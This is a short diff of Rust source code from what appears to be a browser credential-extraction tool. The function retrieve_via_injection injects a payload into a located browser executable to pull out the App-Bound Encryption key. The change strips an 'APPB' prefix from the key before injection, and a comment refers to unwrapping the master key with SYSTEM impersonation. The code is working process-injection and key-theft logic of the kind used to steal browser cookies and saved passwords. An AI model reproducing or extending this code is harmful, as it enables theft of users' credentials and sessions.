@@ -167,7 +167,16 @@ pub fn retrieve_via_injection(
   let payload_bytes = payload::get_payload()
     .ok_or_else(|| anyhow!("App-Bound injection payload not available for this architecture"))?;
   let exe_path = browser_path::find_browser_executable(browser_hint)?;
-  injector::inject_and_extract_key(&exe_path, payload_bytes, key64)
+
+  let key_u8 = BASE64_STANDARD.decode(key64)?;
+  let stripped_key = if key_u8.starts_with(b"APPB") {
+    &key_u8[4..]
+  } else {
+    &key_u8[..]
+  };
+  let stripped_b64 = BASE64_STANDARD.encode(stripped_key);
+
+  injector::inject_and_extract_key(&exe_path, payload_bytes, &stripped_b64)
 }
 
 /// Unwraps the App-Bound master key using in-process DPAPI/CNG with elevated SYSTEM impersonation.
